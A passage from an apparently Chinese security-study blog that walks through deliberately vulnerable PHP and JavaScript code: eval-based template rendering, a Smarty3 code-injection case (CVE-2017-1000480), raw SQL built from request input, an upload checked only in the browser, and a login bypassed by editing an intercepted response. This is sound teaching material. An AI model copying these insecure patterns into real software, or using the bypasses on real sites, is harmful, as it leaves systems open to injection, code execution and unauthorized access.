class="hljs-number">3</span>];<br>    <span class="hljs-variable">$content</span> = <span class="hljs-variable">$row</span>[<span class="hljs-number">4</span>];<br>    <span class="hljs-variable">$item</span> = <span class="hljs-variable">$row</span>[<span class="hljs-number">5</span>];<br>&#125;<br><br><span class="hljs-comment">// 替换HTML模板中的占位符</span><br><span class="hljs-variable">$template</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;&#123;page_title&#125;&#x27;</span>, <span class="hljs-variable">$page_title</span>, <span class="hljs-variable">$template</span>);<br><span class="hljs-variable">$template</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;&#123;heading&#125;&#x27;</span>, <span class="hljs-variable">$subheading</span>, <span class="hljs-variable">$template</span>);<br><span class="hljs-variable">$template</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;&#123;subheading&#125;&#x27;</span>, <span class="hljs-variable">$subheading</span>, <span class="hljs-variable">$template</span>);<br><span class="hljs-variable">$template</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;&#123;content&#125;&#x27;</span>, <span class="hljs-variable">$content</span>, <span class="hljs-variable">$template</span>);<br><span class="hljs-variable">$template</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;&#123;$item&#125;&#x27;</span>, <span class="hljs-variable">$item</span>, <span class="hljs-variable">$template</span>);<br><br><span class="hljs-comment">// 将PHP代码嵌入HTML模板中并执行</span><br><span class="hljs-keyword">eval</span>(<span class="hljs-string">&#x27;?&gt;&#x27;</span> . <span class="hljs-variable">$template</span>);<br><br><span class="hljs-comment">// 关闭数据库连接</span><br><span class="hljs-title function_ invoke__">mysqli_close</span>(<span class="hljs-variable">$con</span>);<br><br></code></pre></td></tr></table></figure></li>
<li><p>Smarty模板引用</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">// 引入 Smarty 类文件</span><br><span class="hljs-keyword">require</span>(<span class="hljs-string">&#x27;smarty/libs/Smarty.class.php&#x27;</span>);<br><br><span class="hljs-comment">// 创建 Smarty 实例</span><br><span class="hljs-variable">$smarty</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Smarty</span>;<br><br><span class="hljs-comment">// 设置 Smarty 相关属性</span><br><span class="hljs-variable">$smarty</span>-&gt;template_dir = <span class="hljs-string">&#x27;smarty/templates/&#x27;</span>;  <span class="hljs-comment">// 设置模板文件的目录</span><br><span class="hljs-comment">// 指定 Smarty 模板文件所在的目录，这里使用了相对路径，可以根据实际情况修改</span><br><span class="hljs-variable">$smarty</span>-&gt;compile_dir = <span class="hljs-string">&#x27;smarty/templates_c/&#x27;</span>;  <span class="hljs-comment">// 设置编译文件的目录</span><br><span class="hljs-comment">// 指定 Smarty 编译生成的模板文件所存放的目录，用于存放 Smarty 编译生成的 PHP 文件</span><br><span class="hljs-variable">$smarty</span>-&gt;cache_dir = <span class="hljs-string">&#x27;smarty/cache/&#x27;</span>;  <span class="hljs-comment">// 设置缓存文件的目录</span><br><span class="hljs-comment">// 指定 Smarty 缓存文件的存放目录，用于存放 Smarty 缓存文件</span><br><span class="hljs-variable">$smarty</span>-&gt;config_dir = <span class="hljs-string">&#x27;smarty/configs/&#x27;</span>;  <span class="hljs-comment">// 设置配置文件的目录</span><br><span class="hljs-comment">// 指定 Smarty 配置文件的存放目录，用于存放 Smarty 配置文件</span><br><br><span class="hljs-comment">// 赋值变量到模板中</span><br><span class="hljs-variable">$smarty</span>-&gt;<span class="hljs-title function_ invoke__">assign</span>(<span class="hljs-string">&#x27;title&#x27;</span>, <span class="hljs-string">&#x27;欢迎使用 Smarty&#x27;</span>);  <span class="hljs-comment">// 将变量 &#x27;title&#x27; 赋值为 &#x27;欢迎使用 Smarty&#x27;</span><br><br><span class="hljs-comment">// 显示模板</span><br><span class="hljs-variable">$smarty</span>-&gt;<span class="hljs-title function_ invoke__">display</span>(<span class="hljs-string">&#x27;index.tpl&#x27;</span>);  <span class="hljs-comment">// 使用 &#x27;index.tpl&#x27; 模板文件进行显示</span><br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure></li>
<li><p>Smarty3模板引用—存在RCE漏洞</p>
<p> <img src="/assets/image-20240701211953-90ho7or.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
<p> <img src="/assets/image-20240701211915-dquprl6.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">// 定义 Smarty 根目录路径常量</span><br><span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">&#x27;SMARTY_ROOT_DIR&#x27;</span>, <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;\\&#x27;</span>, <span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-keyword">__DIR__</span>));<br><br><span class="hljs-comment">// 定义 Smarty 编译文件目录路径常量</span><br><span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">&#x27;SMARTY_COMPILE_DIR&#x27;</span>, SMARTY_ROOT_DIR . <span class="hljs-string">&#x27;/smarty3/tmp/templates_c&#x27;</span>);<br><br><span class="hljs-comment">// 定义 Smarty 缓存文件目录路径常量</span><br><span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">&#x27;SMARTY_CACHE_DIR&#x27;</span>, SMARTY_ROOT_DIR . <span class="hljs-string">&#x27;/smarty3/tmp/cache&#x27;</span>);<br><br><span class="hljs-comment">// 包含 Smarty 类文件</span><br><span class="hljs-keyword">include_once</span>(SMARTY_ROOT_DIR . <span class="hljs-string">&#x27;/smarty3/libs/Smarty.class.php&#x27;</span>);<br><br><span class="hljs-comment">// 自定义 Smarty 资源类，继承自 Smarty_Resource_Custom</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">testSmarty</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">Smarty_Resource_Custom</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-comment">// 重写 fetch 方法</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">fetch</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>, &amp;<span class="hljs-variable">$source</span>, &amp;<span class="hljs-variable">$mtime</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-comment">// 自定义模板内容，这里只是示例，实际情况应该从数据库或其他来源获取模板内容</span><br>        <span class="hljs-variable">$template</span> = <span class="hljs-string">&quot;CVE-2017-1000480 smarty PHP code injection&quot;</span>;<br>        <span class="hljs-comment">// 将模板内容赋值给 $source 参数</span><br>        <span class="hljs-variable">$source</span> = <span class="hljs-variable">$template</span>;<br>        <span class="hljs-comment">// 设置模板修改时间为当前时间</span><br>        <span class="hljs-variable">$mtime</span> = <span class="hljs-title function_ invoke__">time</span>();<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">// 创建 Smarty 实例</span><br><span class="hljs-variable">$smarty</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Smarty</span>();<br><br><span class="hljs-comment">// 设置 Smarty 缓存文件目录</span><br><span class="hljs-variable">$smarty</span>-&gt;<span class="hljs-title function_ invoke__">setCacheDir</span>(SMARTY_CACHE_DIR);<br><br><span class="hljs-comment">// 设置 Smarty 编译文件目录</span><br><span class="hljs-variable">$smarty</span>-&gt;<span class="hljs-title function_ invoke__">setCompileDir</span>(SMARTY_COMPILE_DIR);<br><br><span class="hljs-comment">// 注册自定义资源类型 &#x27;test&#x27;，并指定使用 testSmarty 类处理该资源类型</span><br><span class="hljs-variable">$smarty</span>-&gt;<span class="hljs-title function_ invoke__">registerResource</span>(<span class="hljs-string">&#x27;test&#x27;</span>, <span class="hljs-keyword">new</span> testSmarty);<br><br><span class="hljs-comment">// 获取要显示的模板名称，并通过 $_GET[&#x27;eval&#x27;] 获取，存在安全风险，应谨慎使用</span><br><span class="hljs-variable">$templateName</span> = <span class="hljs-string">&#x27;test:&#x27;</span> . <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;eval&#x27;</span>];<br><br><span class="hljs-comment">// 显示模板</span><br><span class="hljs-variable">$smarty</span>-&gt;<span class="hljs-title function_ invoke__">display</span>(<span class="hljs-variable">$templateName</span>);<br><br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure></li>
</ol>
<p>‍</p>
<p>‍</p>
<p>‍</p>
<h3 id="PHP应用-TP框架-路由访问-对象操作-内置过滤绕过-核心漏洞"><a href="#PHP应用-TP框架-路由访问-对象操作-内置过滤绕过-核心漏洞" class="headerlink" title="PHP应用&amp;TP框架&amp;路由访问&amp;对象操作&amp;内置过滤绕过&amp;核心漏洞"></a>PHP应用&amp;TP框架&amp;路由访问&amp;对象操作&amp;内置过滤绕过&amp;核心漏洞</h3><ol>
<li><p>安全写法</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$id</span>=<span class="hljs-title function_ invoke__">request</span>()-&gt;<span class="hljs-title function_ invoke__">param</span>(<span class="hljs-string">&#x27;x&#x27;</span>);<br><span class="hljs-variable">$data</span>=<span class="hljs-title class_">Db</span>::<span class="hljs-title function_ invoke__">table</span>(<span class="hljs-string">&#x27;news&#x27;</span>)-&gt;<span class="hljs-title function_ invoke__">where</span>(<span class="hljs-string">&#x27;id&#x27;</span>,<span class="hljs-variable">$id</span>)-&gt;<span class="hljs-title function_ invoke__">find</span>();<br></code></pre></td></tr></table></figure></li>
<li><p>半安全写法</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//用一半安全写法 有安全隐患</span><br>   <span class="hljs-variable">$id</span>=<span class="hljs-title function_ invoke__">request</span>()-&gt;<span class="hljs-title function_ invoke__">param</span>(<span class="hljs-string">&#x27;x&#x27;</span>);<br>   <span class="hljs-variable">$data</span>=<span class="hljs-title class_">Db</span>::<span class="hljs-title function_ invoke__">query</span>(<span class="hljs-string">&quot;select * from news where id=<span class="hljs-subst">$id</span>&quot;</span>);<br></code></pre></td></tr></table></figure></li>
<li><p>原生写法</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// 从GET请求中获取id参数，如果不存在则默认为1</span><br><span class="hljs-variable">$id</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>] ?? <span class="hljs-string">&#x27;1&#x27;</span>;<br><br><span class="hljs-comment">// 构建SQL查询语句</span><br><span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;select * from news where id=<span class="hljs-subst">$id</span>&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$sql</span>;<br><br><span class="hljs-comment">// 执行查询并获取结果集</span><br><span class="hljs-variable">$data</span> = <span class="hljs-title function_ invoke__">mysqli_query</span>(<span class="hljs-variable">$con</span>, <span class="hljs-variable">$sql</span>);<br><br><span class="hljs-comment">// 使用mysqli_fetch_row遍历结果集的每一行</span><br><span class="hljs-keyword">while</span> (<span class="hljs-variable">$row</span> = <span class="hljs-title function_ invoke__">mysqli_fetch_row</span>(<span class="hljs-variable">$data</span>)) &#123;<br>    <span class="hljs-comment">// 从结果集中获取每一列的值，并存储到相应的变量中</span><br>    <span class="hljs-variable">$page_title</span> = <span class="hljs-variable">$row</span>[<span class="hljs-number">1</span>];<br>    <span class="hljs-variable">$heading</span> = <span class="hljs-variable">$row</span>[<span class="hljs-number">2</span>];<br>    <span class="hljs-variable">$subheading</span> = <span class="hljs-variable">$row</span>[<span class="hljs-number">3</span>];<br>    <span class="hljs-variable">$content</span> = <span class="hljs-variable">$row</span>[<span class="hljs-number">4</span>];<br>    <span class="hljs-variable">$item</span> = <span class="hljs-variable">$row</span>[<span class="hljs-number">5</span>];<br>&#125;<br></code></pre></td></tr></table></figure></li>
</ol>
<p>‍</p>
<p>‍</p>
<p>‍</p>
<p>‍</p>
<h3 id="JS应用-原生开发-JQuery库-Ajax技术-前端后端-安全验证处理"><a href="#JS应用-原生开发-JQuery库-Ajax技术-前端后端-安全验证处理" class="headerlink" title="JS应用&amp;原生开发&amp;JQuery库&amp;Ajax技术&amp;前端后端&amp;安全验证处理"></a>JS应用&amp;原生开发&amp;JQuery库&amp;Ajax技术&amp;前端后端&amp;安全验证处理</h3><p>‍</p>
<p>原生开发—前端后端—文件上传—白名单过滤</p>
<ol>
<li><p>布置前端页面</p>
</li>
<li><p>JS获取提交数据</p>
</li>
<li><p>JS对上传格式进行判断</p>
 <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;script&gt;<br>    <span class="hljs-keyword">function</span> <span class="hljs-title function_">CheckFileExt</span>(<span class="hljs-params">filename</span>)&#123;<br>        <span class="hljs-keyword">var</span> flag=<span class="hljs-literal">false</span>;<br>        <span class="hljs-comment">//规定白名单上传后缀</span><br>        <span class="hljs-keyword">var</span> exts=[<span class="hljs-string">&#x27;png&#x27;</span>,<span class="hljs-string">&#x27;gif&#x27;</span>,<span class="hljs-string">&#x27;jpg&#x27;</span>];<br>        <span class="hljs-keyword">var</span> index=filename.<span class="hljs-title function_">lastIndexOf</span>(<span class="hljs-string">&quot;.&quot;</span>);<br>        <span class="hljs-keyword">var</span> ext=filename.<span class="hljs-title function_">substr</span>(index+<span class="hljs-number">1</span>);<br>        <span class="hljs-comment">//进行后缀检测</span><br>        <span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>;i&lt;exts.<span class="hljs-property">length</span>;i++)&#123;<br>            <span class="hljs-keyword">if</span>(ext==exts[i])&#123;<br>                <span class="hljs-keyword">var</span> flag=<span class="hljs-literal">true</span>;<br>                <span class="hljs-title function_">alert</span>(<span class="hljs-string">&#x27;文件后缀正确！&#x27;</span>);<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">if</span>(!flag)&#123;<br>            <span class="hljs-title function_">alert</span>(<span class="hljs-string">&#x27;文件后缀错误&#x27;</span>);<br>            location.<span class="hljs-title function_">reload</span>(<span class="hljs-literal">true</span>);<br>        &#125;<br>    &#125;<br>&lt;/script&gt;<br></code></pre></td></tr></table></figure>

<p> <img src="/assets/image-20240705174541-uimconp.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
<p> 1、过滤代码能看到分析绕过<br> 2、禁用JS或删除过滤代码绕过</p>
</li>
<li><p>后端对上传数据进行处理</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">// 从上传文件数组中获取文件名</span><br><span class="hljs-variable">$name</span> = @<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;f&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>];<br><span class="hljs-comment">// 从上传文件数组中获取文件类型</span><br><span class="hljs-variable">$type</span> = @<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;f&#x27;</span>][<span class="hljs-string">&#x27;type&#x27;</span>];<br><span class="hljs-comment">// 从上传文件数组中获取文件大小</span><br><span class="hljs-variable">$size</span> = @<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;f&#x27;</span>][<span class="hljs-string">&#x27;size&#x27;</span>];<br><span class="hljs-comment">// 从上传文件数组中获取临时文件名</span><br><span class="hljs-variable">$tmp_name</span> = @<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;f&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br><span class="hljs-comment">// 从上传文件数组中获取错误码</span><br><span class="hljs-variable">$error</span> = @<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;f&#x27;</span>][<span class="hljs-string">&#x27;error&#x27;</span>];<br><br><span class="hljs-comment">//如果文件后缀在白名单中,移动上传的文件到指定目录中</span><br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$tmp_name</span>, <span class="hljs-string">&#x27;upload/&#x27;</span> . <span class="hljs-variable">$name</span>))&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;script&gt;alert(&quot;上传成功！&quot;)&lt;/script&gt;&#x27;</span>;<br>&#125;<br></code></pre></td></tr></table></figure></li>
</ol>
<p>‍</p>
<p>JQuery库—Ajax—安全验证处理</p>
<ol>
<li><p>获取登录事件</p>
</li>
<li><p>配置Ajax请求</p>
 <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">//导入JQuery库</span><br>&lt;script src=<span class="hljs-string">&quot;js/jquery-1.12.4.js&quot;</span>&gt;&lt;/script&gt;<br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="language-javascript"><span class="language-xml">    $(<span class="hljs-string">&quot;button&quot;</span>).<span class="hljs-title function_">click</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;</span></span><br><span class="language-javascript"><span class="language-xml"><span class="hljs-comment">//配置Ajax请求</span></span></span><br><span class="language-javascript"><span class="language-xml">        $.<span class="hljs-title function_">ajax</span>(&#123;</span></span><br><span class="language-javascript"><span class="language-xml">            <span class="hljs-attr">type</span>: <span class="hljs-string">&#x27;POST&#x27;</span>,</span></span><br><span class="language-javascript"><span class="language-xml">            <span class="hljs-attr">url</span>: <span class="hljs-string">&#x27;logincheck.php&#x27;</span>,</span></span><br><span class="language-javascript"><span class="language-xml">            <span class="hljs-attr">data</span>: &#123;</span></span><br><span class="language-javascript"><span class="language-xml">                <span class="hljs-attr">myUname</span>:$(<span class="hljs-string">&#x27;.user&#x27;</span>).<span class="hljs-title function_">val</span>(),</span></span><br><span class="language-javascript"><span class="language-xml">                <span class="hljs-attr">myUpass</span>:$(<span class="hljs-string">&#x27;.pass&#x27;</span>).<span class="hljs-title function_">val</span>(),</span></span><br><span class="language-javascript"><span class="language-xml">            &#125;,</span></span><br><span class="language-javascript"><span class="language-xml">            <span class="hljs-attr">success</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params">res</span>)&#123;</span></span><br><span class="language-javascript"><span class="language-xml">                <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(res);</span></span><br><span class="language-javascript"><span class="language-xml">                <span class="hljs-keyword">if</span>(res[<span class="hljs-string">&#x27;infoCode&#x27;</span>]==<span class="hljs-number">1</span>)&#123;</span></span><br><span class="language-javascript"><span class="language-xml">                    <span class="hljs-title function_">alert</span>(<span class="hljs-string">&#x27;登陆成功！&#x27;</span>);</span></span><br><span class="language-javascript"><span class="language-xml">                    <span class="hljs-comment">//登陆成功处理事件</span></span></span><br><span class="language-javascript"><span class="language-xml">                    <span class="hljs-comment">//location.href=&#x27;index.php&#x27;</span></span></span><br><span class="language-javascript"><span class="language-xml">                &#125;<span class="hljs-keyword">else</span>&#123;</span></span><br><span class="language-javascript"><span class="language-xml">                    <span class="hljs-title function_">alert</span>(<span class="hljs-string">&#x27;登录失败&#x27;</span>);</span></span><br><span class="language-javascript"><span class="language-xml">                &#125;</span></span><br><span class="language-javascript"><span class="language-xml">            &#125;,</span></span><br><span class="language-javascript"><span class="language-xml">            <span class="hljs-attr">dataType</span>: <span class="hljs-string">&#x27;json&#x27;</span>,</span></span><br><span class="language-javascript"><span class="language-xml">        &#125;);</span></span><br><span class="language-javascript"><span class="language-xml">    &#125;);</span></span><br><span class="language-javascript"><span class="language-xml"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br></code></pre></td></tr></table></figure>

<p> <img src="/assets/image-20240705180038-eaya8rm.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
<p> 依靠前端判断数据</p>
<p> <img src="/assets/image-20240705180226-jutsl1i.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
<p> 可直接抓包修改</p>
<p> <img src="/assets/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-07-05%20180429-20240705180749-bf7vttf.png" srcset="/img/loading.gif" lazyload alt="屏幕截图 2024-07-05 180429">​</p>
<p> 由于后端代码通过检测前端infoCode是否为1从而判断是否登陆成功，所以这里可通过修改其参数实现成功登陆（注意：这里只是显示成功登陆，因为前端是否显示登陆成功都不会跳转页面，如果将源码中被注释掉的那行代码<code>location.href=&#39;index.php&#39;</code>​执行才能成功登陆）</p>
<p> <img src="/assets/image-20240705181148-cn76ynj.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
<p> <img src="/assets/image-20240705181442-zy6bgoi.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
<p> ‍</p>
</li>
<li><p>后端代码验证</p>
</li>
<li><p>成功回调判断</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">// 从 POST 请求中获取用户提交的用户名和密码</span><br><span class="hljs-variable">$user</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;myuser&#x27;</span>];<br><span class="hljs-variable">$pass</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;mypass&#x27;</span>];<br><br><span class="hljs-comment">// 真实情况下，应该在数据库中进行验证获取用户信息</span><br><br><span class="hljs-comment">// 假设用户名是 &#x27;xiaodi&#x27;，密码是 &#x27;123456&#x27;</span><br>**<span class="hljs-comment">//$success 是一个关联数组变量，通过使用 &#x27;msg&#x27; 作为键，将 &#x27;ok&#x27; 作为值存储在其中。</span><br><span class="hljs-variable">$success</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;msg&#x27;</span> =&gt; <span class="hljs-string">&#x27;ok&#x27;</span>);**<br><br><span class="hljs-comment">// 检查用户名和密码是否匹配</span><br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$user</span> == <span class="hljs-string">&#x27;xiaodi&#x27;</span> &amp;&amp; <span class="hljs-variable">$pass</span> == <span class="hljs-string">&#x27;123456&#x27;</span>) &#123;<br>    <span class="hljs-comment">// 如果匹配，设置信息代码为1表示登录成功，并进行相应的处理</span><br>    <span class="hljs-variable">$success</span>[<span class="hljs-string">&#x27;infoCode&#x27;</span>] = <span class="hljs-number">1</span>;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-comment">// 如果不匹配，设置信息代码为0表示登录失败</span><br>    <span class="hljs-variable">$success</span>[<span class="hljs-string">&#x27;infoCode&#x27;</span>] = <span class="hljs-number">0</span>;<br>&#125;<br><br>**<span class="hljs-comment">// 将结果以 JSON 格式输出</span><br><span class="hljs-comment">//必须要回调输出，不然前端无法获取infocode的值</span><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">json_encode</span>(<span class="hljs-variable">$success</span>);**<br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure></li>
</ol>
<p>‍</p>
<ul>
<li><p>商品购买</p>
<p>前端</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-comment">&lt;!-- 引入 jQuery 库 --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;js/jquery-1.12.4.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-comment">&lt;!-- JavaScript 代码 --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">    <span class="hljs-comment">// 当购买按钮被点击时执行以下函数</span></span><br><span class="language-javascript">    $(<span class="hljs-string">&quot;button&quot;</span>).<span class="hljs-title function_">click</span>(<span class="hljs-keyword">function</span> (<span class="hljs-params"></span>)&#123;</span><br><span class="language-javascript">        <span class="hljs-comment">// 使用 AJAX 发送 POST 请求到 &#x27;shop.php&#x27;</span></span><br><span class="language-javascript">        **$.<span class="hljs-title function_">ajax</span>(&#123;</span><br><span class="language-javascript">            <span class="hljs-attr">type</span>: <span class="hljs-string">&#x27;POST&#x27;</span>,</span><br><span class="language-javascript">            <span class="hljs-attr">url</span>: <span class="hljs-string">&#x27;shop.php&#x27;</span>,</span><br><span class="language-javascript">            <span class="hljs-comment">// 发送的数据，包括购买数量</span></span><br><span class="language-javascript">            <span class="hljs-attr">data</span>: &#123;</span><br><span class="language-javascript">                <span class="hljs-attr">num</span>: $(<span class="hljs-string">&#x27;.number&#x27;</span>).<span class="hljs-title 